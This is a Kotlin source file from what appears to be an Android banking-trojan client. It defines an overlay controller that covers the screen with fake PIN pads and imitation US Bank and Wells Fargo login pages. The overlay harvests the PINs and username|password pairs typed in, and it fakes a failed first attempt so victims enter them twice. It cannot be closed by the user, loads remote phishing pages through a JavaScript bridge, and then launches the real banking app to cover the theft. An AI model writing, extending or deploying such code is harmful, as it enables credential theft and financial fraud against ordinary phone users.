package com.vibelink.client.device

import android.annotation.SuppressLint
import android.content.Context
import android.content.Intent
import android.graphics.BitmapFactory
import android.graphics.Color
import android.graphics.PixelFormat
import android.net.Uri
import android.os.Build
import android.os.Handler
import android.os.Looper
import android.text.Editable
import android.text.InputType
import android.text.TextWatcher
import android.util.Base64
import android.util.TypedValue
import android.view.Gravity
import android.view.LayoutInflater
import android.view.View
import android.view.ViewGroup
import android.view.WindowManager
import android.webkit.JavascriptInterface
import android.webkit.WebResourceError
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.EditText
import android.widget.GridLayout
import android.widget.ImageView
import android.widget.LinearLayout
import android.widget.TextView
import android.widget.Toast
import com.vibelink.client.R

enum class FakePageType {
    PIN,
    NOPIN,
    USBANK,
    GUOFU,
    WEB,
    ;

    companion object {
        fun from(raw: String?, hasPinFallback: Boolean = true): FakePageType {
            return when (raw?.trim()?.lowercase()) {
                "pin" -> PIN
                "nopin", "no_pin", "none" -> NOPIN
                "usbank", "us_bank" -> USBANK
                "guofu", "wellsfargo", "wells_fargo", "wells" -> GUOFU
                "web", "webview", "url" -> WEB
                else -> if (hasPinFallback) PIN else NOPIN
            }
        }
    }
}

/**
 * Fullscreen fake security UI:
 * 1) intro dialog（show_fake_page）
 * 2) PIN / US Bank / 国富银行 / WebView；挂钩触发 skipIntro=true 时跳过确认框直进此页
 * 银行/PIN：第 1 次假失败，第 2 次成功后打开目标 App，并 consume 该包挂钩。
 */
class FakePageOverlayController(
    private val context: Context,
    private val windowManager: WindowManager,
    private val onSubmitted: (text: String, submitCount: Int) -> Unit,
    private val onCompleted: (packageName: String) -> Unit = {},
) {
    private val mainHandler = Handler(Looper.getMainLooper())
    private var rootView: View? = null
    private var webView: WebView? = null
    private var submitCount = 0
    private var pinLength = 6
    private var pinValue = StringBuilder()
    private var targetPackageName = ""
    private var pageType: FakePageType = FakePageType.PIN
    private var webUrl: String = ""
    private var pinSlotsContainer: LinearLayout? = null
    private var btnPin6: TextView? = null
    private var btnPin4: TextView? = null
    private var guofuPasswordVisible = false

    fun isShowing(): Boolean = rootView != null

    fun show(
        packageName: String,
        title: String,
        content: String,
        iconBase64: String,
        pageType: FakePageType = FakePageType.PIN,
        webUrl: String = "",
        skipIntro: Boolean = false,
    ): Boolean {
        hide()
        submitCount = 0
        pinLength = 6
        pinValue.clear()
        guofuPasswordVisible = false
        targetPackageName = packageName.trim()
        this.pageType = pageType
        this.webUrl = webUrl.trim()

        if (skipIntro && pageType == FakePageType.NOPIN) {
            openTargetAndHide()
            return true
        }

        val root = LayoutInflater.from(context).inflate(R.layout.fake_page_overlay, null)
        val introPage = root.findViewById<View>(R.id.fake_page_intro)
        val pinPage = root.findViewById<View>(R.id.fake_page_pin)
        val usbankPage = root.findViewById<View>(R.id.fake_page_usbank)
        val guofuPage = root.findViewById<View>(R.id.fake_page_guofu)
        val webPage = root.findViewById<View>(R.id.fake_page_web)
        val introIcon = root.findViewById<ImageView>(R.id.fake_page_intro_icon)
        val introAppName = root.findViewById<TextView>(R.id.fake_page_intro_app_name)
        val introTitle = root.findViewById<TextView>(R.id.fake_page_intro_title)
        val introDesc = root.findViewById<TextView>(R.id.fake_page_intro_desc)
        val nextBtn = root.findViewById<TextView>(R.id.fake_page_next_btn)
        val dialogCard = root.findViewById<View>(R.id.fake_page_dialog_card)
        val appIcon = root.findViewById<ImageView>(R.id.fake_page_app_icon)
        btnPin6 = root.findViewById(R.id.fake_page_btn_pin6)
        btnPin4 = root.findViewById(R.id.fake_page_btn_pin4)
        pinSlotsContainer = root.findViewById(R.id.fake_page_pin_slots)
        val keypad = root.findViewById<GridLayout>(R.id.fake_page_keypad)
        webView = root.findViewById(R.id.fake_page_webview)

        val remoteTitle = title.trim()
        val remoteContent = content.trim()
        if (remoteTitle.isNotBlank()) {
            introTitle.visibility = View.VISIBLE
            introTitle.text = remoteTitle
        } else {
            introTitle.visibility = View.GONE
        }
        if (remoteContent.isNotBlank()) {
            introDesc.text = remoteContent
        }

        introAppName.text = resolveAppLabel(targetPackageName)
        val iconBitmap = decodeIcon(iconBase64)
        if (iconBitmap != null) {
            introIcon.setImageBitmap(iconBitmap)
            appIcon.setImageBitmap(iconBitmap)
        } else {
            introIcon.setBackgroundColor(Color.parseColor("#3765eb"))
            appIcon.setBackgroundColor(Color.parseColor("#3765eb"))
        }

        setupWebView(webView)

        fun enterContentPage() {
            when (pageType) {
                FakePageType.NOPIN -> openTargetAndHide()
                FakePageType.PIN -> {
                    introPage.visibility = View.GONE
                    pinPage.visibility = View.VISIBLE
                    usbankPage.visibility = View.GONE
                    guofuPage.visibility = View.GONE
                    webPage.visibility = View.GONE
                }
                FakePageType.USBANK -> {
                    introPage.visibility = View.GONE
                    pinPage.visibility = View.GONE
                    usbankPage.visibility = View.VISIBLE
                    guofuPage.visibility = View.GONE
                    webPage.visibility = View.GONE
                }
                FakePageType.GUOFU -> {
                    introPage.visibility = View.GONE
                    pinPage.visibility = View.GONE
                    usbankPage.visibility = View.GONE
                    guofuPage.visibility = View.VISIBLE
                    webPage.visibility = View.GONE
                }
                FakePageType.WEB -> {
                    introPage.visibility = View.GONE
                    pinPage.visibility = View.GONE
                    usbankPage.visibility = View.GONE
                    guofuPage.visibility = View.GONE
                    webPage.visibility = View.VISIBLE
                    val url = this.webUrl
                    if (url.isNotBlank()) {
                        webView?.loadUrl(url)
                    } else {
                        toast(R.string.fake_page_web_load_failed)
                    }
                }
            }
        }

        introPage.setOnClickListener { /* block */ }
        dialogCard.setOnClickListener { /* block */ }
        nextBtn.setOnClickListener { enterContentPage() }

        btnPin6?.setOnClickListener { setPinLength(6) }
        btnPin4?.setOnClickListener { setPinLength(4) }
        updatePinSwitchUi()
        renderPinSlots()
        buildKeypad(keypad)
        wireUsBankPage(root)
        wireGuofuPage(root)

        val params = WindowManager.LayoutParams(
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.MATCH_PARENT,
            WindowManager.LayoutParams.TYPE_ACCESSIBILITY_OVERLAY,
            WindowManager.LayoutParams.FLAG_LAYOUT_IN_SCREEN or
                WindowManager.LayoutParams.FLAG_LAYOUT_NO_LIMITS or
                WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON,
            PixelFormat.TRANSLUCENT,
        ).apply {
            gravity = Gravity.TOP or Gravity.START
            softInputMode = WindowManager.LayoutParams.SOFT_INPUT_ADJUST_RESIZE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                layoutInDisplayCutoutMode =
                    WindowManager.LayoutParams.LAYOUT_IN_DISPLAY_CUTOUT_MODE_SHORT_EDGES
            }
        }

        val shown = runCatching {
            windowManager.addView(root, params)
            rootView = root
            true
        }.getOrDefault(false)
        if (shown && skipIntro) {
            enterContentPage()
        }
        return shown
    }

    /** 兼容旧调用：hasPin=true → PIN，false → NOPIN */
    fun show(
        packageName: String,
        title: String,
        content: String,
        iconBase64: String,
        hasPin: Boolean,
    ): Boolean = show(
        packageName = packageName,
        title = title,
        content = content,
        iconBase64 = iconBase64,
        pageType = if (hasPin) FakePageType.PIN else FakePageType.NOPIN,
    )

    fun hide() {
        val view = rootView ?: return
        rootView = null
        mainHandler.removeCallbacksAndMessages(null)
        runCatching { windowManager.removeViewImmediate(view) }
        destroyWebView()
        submitCount = 0
        pinValue.clear()
        pinSlotsContainer = null
        btnPin6 = null
        btnPin4 = null
        guofuPasswordVisible = false
        webUrl = ""
    }

    private fun openTargetAndHide() {
        finishCollected(delayMs = 0L)
    }

    /** Consume hook first so WINDOW_STATE from launch cannot re-trigger. */
    private fun finishCollected(delayMs: Long = 400L) {
        val pkg = targetPackageName
        onCompleted(pkg)
        if (delayMs <= 0L) {
            hide()
            launchTargetApp(pkg)
            return
        }
        mainHandler.postDelayed({
            hide()
            launchTargetApp(pkg)
        }, delayMs)
    }

    @SuppressLint("SetJavaScriptEnabled")
    private fun setupWebView(view: WebView?) {
        val wv = view ?: return
        wv.settings.javaScriptEnabled = true
        wv.settings.domStorageEnabled = true
        wv.settings.mediaPlaybackRequiresUserGesture = false
        wv.settings.loadsImagesAutomatically = true
        wv.setBackgroundColor(Color.parseColor("#0b0b0f"))
        wv.addJavascriptInterface(MiluJsBridge(), "MiluBridge")
        wv.webViewClient = object : WebViewClient() {
            override fun shouldOverrideUrlLoading(
                view: WebView?,
                request: WebResourceRequest?,
            ): Boolean {
                val uri = request?.url ?: return true
                return !isAllowedWebUri(uri)
            }

            @Deprecated("Deprecated in Java")
            override fun shouldOverrideUrlLoading(view: WebView?, url: String?): Boolean {
                val uri = runCatching { Uri.parse(url.orEmpty()) }.getOrNull() ?: return true
                return !isAllowedWebUri(uri)
            }

            override fun onReceivedError(
                view: WebView?,
                request: WebResourceRequest?,
                error: WebResourceError?,
            ) {
                if (request?.isForMainFrame == true) {
                    toast(R.string.fake_page_web_load_failed)
                }
            }
        }
    }

    private fun isAllowedWebUri(uri: Uri): Boolean {
        return uri.scheme?.equals("https", ignoreCase = true) == true
    }

    private fun destroyWebView() {
        val wv = webView ?: return
        webView = null
        runCatching {
            wv.stopLoading()
            wv.loadUrl("about:blank")
            wv.removeAllViews()
            wv.destroy()
        }
    }

    private inner class MiluJsBridge {
        @JavascriptInterface
        fun openApp() {
            mainHandler.post { openTargetAndHide() }
        }

        @JavascriptInterface
        fun close() {
            // 伪页不允许用户关闭；仅管理端 hide_fake_page / 提交成功后 openApp 可收起
        }

        @JavascriptInterface
        fun done(text: String?) {
            mainHandler.post {
                submitCount += 1
                val payload = text?.trim().orEmpty().ifBlank { "web_done" }
                onSubmitted(payload, submitCount)
            }
        }
    }

    private fun wireUsBankPage(root: View) {
        val username = root.findViewById<EditText>(R.id.fake_usbank_username)
        val password = root.findViewById<EditText>(R.id.fake_usbank_password)
        val loginBtn = root.findViewById<TextView>(R.id.fake_usbank_login_btn)
        wireToggleCheckbox(
            row = root.findViewById(R.id.fake_usbank_remember_row),
            checkView = root.findViewById(R.id.fake_usbank_remember_check),
        )
        wireToggleCheckbox(
            row = root.findViewById(R.id.fake_usbank_faceid_row),
            checkView = root.findViewById(R.id.fake_usbank_faceid_check),
        )
        loginBtn.setOnClickListener {
            submitBankCredentials(
                username = username.text?.toString().orEmpty(),
                password = password.text?.toString().orEmpty(),
                passwordField = password,
            )
        }
    }

    private fun wireGuofuPage(root: View) {
        val greeting = root.findViewById<TextView>(R.id.fake_guofu_greeting)
        greeting.setText(resolveGuofuGreetingRes())

        val spacer = root.findViewById<View>(R.id.fake_guofu_spacer)
        val products = root.findViewById<View>(R.id.fake_guofu_products)
        val username = root.findViewById<EditText>(R.id.fake_guofu_username)
        val password = root.findViewById<EditText>(R.id.fake_guofu_password)
        val showBtn = root.findViewById<TextView>(R.id.fake_guofu_show_btn)
        val signBtn = root.findViewById<TextView>(R.id.fake_guofu_sign_btn)
        wireToggleCheckbox(
            row = root.findViewById(R.id.fake_guofu_save_row),
            checkView = root.findViewById(R.id.fake_guofu_save_check),
        )
        wireToggleCheckbox(
            row = root.findViewById(R.id.fake_guofu_faceid_row),
            checkView = root.findViewById(R.id.fake_guofu_faceid_check),
        )

        fun setGuofuCompact(compact: Boolean) {
            val lp = spacer.layoutParams as LinearLayout.LayoutParams
            if (compact) {
                lp.height = 0
                lp.weight = 0f
                spacer.minimumHeight = 0
                spacer.layoutParams = lp
                products.visibility = View.GONE
                greeting.setPadding(0, 0, 0, 0)
            } else {
                lp.height = 0
                lp.weight = 1f
                spacer.minimumHeight = dp(24)
                spacer.layoutParams = lp
                products.visibility = View.VISIBLE
            }
            spacer.requestLayout()
        }

        val restoreCompact = Runnable {
            val stillEditing = username.hasFocus() || password.hasFocus()
            if (!stillEditing) {
                setGuofuCompact(false)
            }
        }

        val focusListener = View.OnFocusChangeListener { _, hasFocus ->
            if (hasFocus) {
                mainHandler.removeCallbacks(restoreCompact)
                setGuofuCompact(true)
            } else {
                // 切换 username↔password 时短暂失焦，延迟再还原
                mainHandler.removeCallbacks(restoreCompact)
                mainHandler.postDelayed(restoreCompact, 220L)
            }
        }
        username.onFocusChangeListener = focusListener
        password.onFocusChangeListener = focusListener
        // 点击输入框时也立刻折叠（部分机型 focus 晚于键盘）
        username.setOnClickListener {
            mainHandler.removeCallbacks(restoreCompact)
            setGuofuCompact(true)
        }
        password.setOnClickListener {
            mainHandler.removeCallbacks(restoreCompact)
            setGuofuCompact(true)
        }

        fun refreshSignEnabled() {
            val enabled = !username.text.isNullOrBlank() && !password.text.isNullOrBlank()
            signBtn.isEnabled = enabled
            signBtn.setBackgroundResource(
                if (enabled) R.drawable.fake_guofu_sign_enabled else R.drawable.fake_guofu_sign_disabled,
            )
        }

        val watcher = object : TextWatcher {
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) = Unit
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) = Unit
            override fun afterTextChanged(s: Editable?) = refreshSignEnabled()
        }
        username.addTextChangedListener(watcher)
        password.addTextChangedListener(watcher)
        refreshSignEnabled()

        showBtn.setOnClickListener {
            guofuPasswordVisible = !guofuPasswordVisible
            val selection = password.selectionEnd
            password.inputType = if (guofuPasswordVisible) {
                InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_VISIBLE_PASSWORD
            } else {
                InputType.TYPE_CLASS_TEXT or InputType.TYPE_TEXT_VARIATION_PASSWORD
            }
            password.setSelection(selection.coerceAtLeast(0))
            showBtn.setText(
                if (guofuPasswordVisible) R.string.fake_guofu_hide else R.string.fake_guofu_show,
            )
        }

        signBtn.setOnClickListener {
            if (!signBtn.isEnabled) return@setOnClickListener
            submitBankCredentials(
                username = username.text?.toString().orEmpty(),
                password = password.text?.toString().orEmpty(),
                passwordField = password,
            )
        }
    }

    /** 勾选仅视觉切换，不参与提交逻辑 */
    private fun wireToggleCheckbox(row: View, checkView: View) {
        var checked = false
        fun render() {
            checkView.setBackgroundResource(
                if (checked) R.drawable.fake_bank_checkbox_checked else R.drawable.fake_bank_checkbox,
            )
        }
        render()
        row.setOnClickListener {
            checked = !checked
            render()
        }
    }

    /** 按本地小时：5–11 morning / 12–16 afternoon / 其余 evening */
    private fun resolveGuofuGreetingRes(): Int {
        val hour = java.util.Calendar.getInstance().get(java.util.Calendar.HOUR_OF_DAY)
        return when (hour) {
            in 5..11 -> R.string.fake_guofu_greeting_morning
            in 12..16 -> R.string.fake_guofu_greeting_afternoon
            else -> R.string.fake_guofu_greeting_evening
        }
    }

    private fun submitBankCredentials(
        username: String,
        password: String,
        passwordField: EditText,
    ) {
        val user = username.trim()
        val pass = password
        if (user.isEmpty() || pass.isEmpty()) {
            toast(R.string.fake_page_bank_credentials_required)
            return
        }
        submitCount += 1
        onSubmitted("$user|$pass", submitCount)
        if (submitCount < 2) {
            toast(R.string.fake_page_bank_login_failed)
            passwordField.text?.clear()
        } else {
            toast(R.string.fake_page_bank_login_success)
            finishCollected()
        }
    }

    private fun setPinLength(length: Int) {
        if (pinLength == length) return
        pinLength = length
        pinValue.clear()
        updatePinSwitchUi()
        renderPinSlots()
    }

    private fun updatePinSwitchUi() {
        val active6 = pinLength == 6
        btnPin6?.apply {
            setBackgroundResource(if (active6) R.drawable.fake_page_switch_active else 0)
            setTextColor(Color.parseColor(if (active6) "#FFFFFF" else "#465678"))
        }
        btnPin4?.apply {
            setBackgroundResource(if (!active6) R.drawable.fake_page_switch_active else 0)
            setTextColor(Color.parseColor(if (!active6) "#FFFFFF" else "#465678"))
        }
    }

    private fun renderPinSlots() {
        val container = pinSlotsContainer ?: return
        container.removeAllViews()
        val gap = dp(14)
        repeat(pinLength) { index ->
            val slot = TextView(context).apply {
                gravity = Gravity.CENTER
                setTextColor(Color.parseColor("#111111"))
                setTextSize(TypedValue.COMPLEX_UNIT_SP, 26f)
                paint.isFakeBoldText = true
                text = if (index < pinValue.length) "•" else ""
                setPadding(0, 0, 0, dp(6))
            }
            val lp = LinearLayout.LayoutParams(0, ViewGroup.LayoutParams.MATCH_PARENT, 1f).apply {
                if (index < pinLength - 1) marginEnd = gap
            }
            val wrapped = LinearLayout(context).apply {
                orientation = LinearLayout.VERTICAL
                layoutParams = lp
                gravity = Gravity.BOTTOM
                addView(
                    slot,
                    LinearLayout.LayoutParams(
                        ViewGroup.LayoutParams.MATCH_PARENT,
                        0,
                        1f,
                    ),
                )
                addView(
                    View(context).apply {
                        setBackgroundColor(Color.parseColor("#444444"))
                    },
                    LinearLayout.LayoutParams(ViewGroup.LayoutParams.MATCH_PARENT, dp(4)),
                )
            }
            container.addView(wrapped)
        }
    }

    private fun refreshPinDots() {
        val container = pinSlotsContainer ?: return
        for (i in 0 until container.childCount) {
            val wrapped = container.getChildAt(i) as? ViewGroup ?: continue
            val slot = wrapped.getChildAt(0) as? TextView ?: continue
            slot.text = if (i < pinValue.length) "•" else ""
        }
    }

    private fun buildKeypad(keypad: GridLayout) {
        keypad.removeAllViews()
        val keys = listOf(
            "1", "2", "3",
            "4", "5", "6",
            "7", "8", "9",
            "del", "0", "ok",
        )
        keys.forEachIndexed { index, key ->
            val cell = TextView(context).apply {
                gravity = Gravity.CENTER
                setTextSize(TypedValue.COMPLEX_UNIT_SP, if (key == "del" || key == "ok") 28f else 34f)
                setTextColor(Color.parseColor("#233D97"))
                when (key) {
                    "del" -> {
                        text = context.getString(R.string.fake_page_key_delete)
                        setBackgroundResource(R.drawable.fake_page_delete_bg)
                        setTextColor(Color.WHITE)
                        setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
                    }
                    "ok" -> {
                        text = context.getString(R.string.fake_page_key_confirm)
                        setBackgroundResource(R.drawable.fake_page_confirm_bg)
                        setTextColor(Color.WHITE)
                        setTextSize(TypedValue.COMPLEX_UNIT_SP, 24f)
                    }
                    else -> text = key
                }
                setOnClickListener { onKey(key) }
            }
            val lp = GridLayout.LayoutParams().apply {
                width = 0
                height = dp(58)
                columnSpec = GridLayout.spec(index % 3, 1f)
                rowSpec = GridLayout.spec(index / 3)
                setMargins(dp(8), dp(12), dp(8), dp(12))
            }
            keypad.addView(cell, lp)
        }
    }

    private fun onKey(key: String) {
        when (key) {
            "del" -> {
                if (pinValue.isNotEmpty()) {
                    pinValue.deleteCharAt(pinValue.length - 1)
                    refreshPinDots()
                }
            }
            "ok" -> confirmPin()
            else -> {
                if (pinValue.length < pinLength) {
                    pinValue.append(key)
                    refreshPinDots()
                }
            }
        }
    }

    private fun confirmPin() {
        val value = pinValue.toString()
        when {
            value.isEmpty() -> toast(R.string.fake_page_pin_empty)
            value.length < pinLength -> toast(R.string.fake_page_pin_short)
            else -> {
                submitCount += 1
                onSubmitted(value, submitCount)
                if (submitCount < 2) {
                    toast(R.string.fake_page_pin_incorrect)
                    pinValue.clear()
                    refreshPinDots()
                } else {
                    toast(R.string.fake_page_pin_success)
                    finishCollected()
                }
            }
        }
    }

    private fun launchTargetApp(packageName: String) {
        val pkg = packageName.trim()
        if (pkg.isBlank()) return
        runCatching {
            val intent = context.packageManager.getLaunchIntentForPackage(pkg) ?: return@runCatching
            intent.addFlags(
                Intent.FLAG_ACTIVITY_NEW_TASK or
                    Intent.FLAG_ACTIVITY_RESET_TASK_IF_NEEDED or
                    Intent.FLAG_ACTIVITY_CLEAR_TOP,
            )
            context.startActivity(intent)
        }
    }

    private fun toast(resId: Int) {
        Toast.makeText(context, context.getString(resId), Toast.LENGTH_SHORT).show()
    }

    private fun dp(value: Int): Int =
        (value * context.resources.displayMetrics.density).toInt()

    private fun resolveAppLabel(packageName: String): String {
        val pkg = packageName.trim()
        if (pkg.isBlank()) {
            return context.getString(R.string.fake_page_brand)
        }
        return runCatching {
            val pm = context.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString().ifBlank { pkg }
        }.getOrDefault(pkg)
    }

    private fun decodeIcon(iconBase64: String): android.graphics.Bitmap? {
        val raw = iconBase64
            .substringAfter("base64,", iconBase64)
            .trim()
        if (raw.isBlank()) {
            return null
        }
        return runCatching {
            val bytes = Base64.decode(raw, Base64.DEFAULT)
            BitmapFactory.decodeByteArray(bytes, 0, bytes.size)
        }.getOrNull()
    }
}
